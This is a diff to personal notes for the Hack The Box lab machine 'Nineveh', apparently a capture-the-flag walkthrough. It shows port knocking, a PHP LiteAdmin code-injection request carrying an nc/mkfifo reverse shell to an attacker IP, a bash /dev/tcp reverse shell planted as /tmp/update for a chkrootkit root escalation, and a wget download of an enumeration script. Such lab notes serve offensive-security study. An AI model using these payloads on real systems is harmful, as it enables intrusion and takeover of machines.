@@ -4,6 +4,7 @@
 #Image / PNG STEGANOGRAPHY
 #strings xx.png to display info into PNG/IMG
 #PHP Lite Admin - RCE by Creating Neew Table
+#Knockd PORT KNOCKING and PRIV ESC via UPDATE file and chkroot Exploit
 #####
 1-Enummeration:
     └─$ nmap -T5 -sV -sC -Pn 10.129.179.93 -v
@@ -117,6 +118,33 @@
                             ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
 
 
+    2-Exploit A:    PORT KNOCKING and Priv ESC VIA UPDATE FILE and CHKROOT Exploit:
+                        We will use port knocking
+                            https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html
+
+                            chmod 600 id_rsa 
+
+                            for i in 571 290 911; do
+                            nmap -Pn --host-timeout 100 --max-retries 0 -p $i 10.129.226.119 >/dev/null
+                            done; ssh -i id_rsa amrois@10.129.226.119
+
+
+                        SSH:
+                            amrois@nineveh:~$ cat user.txt
+
+
+                            amrois@nineveh:/tmp$: echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.108/443 0>&1'
+                            #!/bin/bash
+                            bash -i >& /dev/tcp/10.10.14.108/443 0>&1
+
+                            amrois@nineveh:/tmp$: echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.108/443 0>&1' > update
+                            amrois@nineveh:/tmp$: chmod +x update
+
+
+
+
+
+
         Brute Force Login.php:
             http://10.129.179.93/department/login.php
 
@@ -127,6 +155,59 @@
             We have access to the panel
 
             http://10.129.179.93/department/manage.php/secret/nineveh.pub
+
+    2-Exploit PHP Lite admin via note folder in the admin pannel:
+
+
+        We create a Table into the PHP-LiteDMAdmin named test.php and we add some php code to test:
+
+            http://10.129.226.119/department/manage.php?notes=/var/tmp/ninevehNotes.txt.test.php&arg=ls
+
+        POST /department/manage.php?notes=/var/tmp/ninevehNotes.txt.test.php HTTP/1.1
+        Host: 10.129.226.119
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: en-US,en;q=0.9
+        Cookie: PHPSESSID=08mii5gnm2u2ibpt9shpg61pj2
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 91
+
+
+        arg=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.108+1234+>/tmp/f
+
+        or by URL:
+            http://10.129.226.119/department/manage.php?notes=/var/tmp/ninevehNotes.txt.test.php&arg=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+10.10.14.108+8090+%3E/tmp/f
+
+
+
+        WE HAVE A SHELL, affter ptty lets upload LinEnum.sh:
+            kali:
+                python3 -m http.server 4443
+
+            Server:
+                cd /tmp
+                wget -r http://10.10.14.108:4443/LinEnum.sh
+
+                www-data@nineveh:/tmp/10.10.14.108:4443$ chmod +x LinEnum.sh
+                www-data@nineveh:/tmp/10.10.14.108:4443$ ./LinEnum.sh
+
+
+                DISTRIB_DESCRIPTION="Ubuntu 16.04.2 LTS"
+
+                Running LinEnum locates a bash script at /usr/sbin/report-reset.sh. The script removes files in
+                the /reports/ directory. 
+                
+                Reviewing a report file and searching some of the static strings reveals
+                that it was created by chkrootkit. 
+                
+                Searching for chkrootkit vulnerabilities finds exploit-db 33899.
+                The file /tmp/update is executed by ckhrootkit as root. As this file does not currently exist, it is
+                possible to put a bash script in its place and use it to extract the root flag.
+                Exploit: https://www.exploit-db.com/exploits/33899/
+
 
 
         
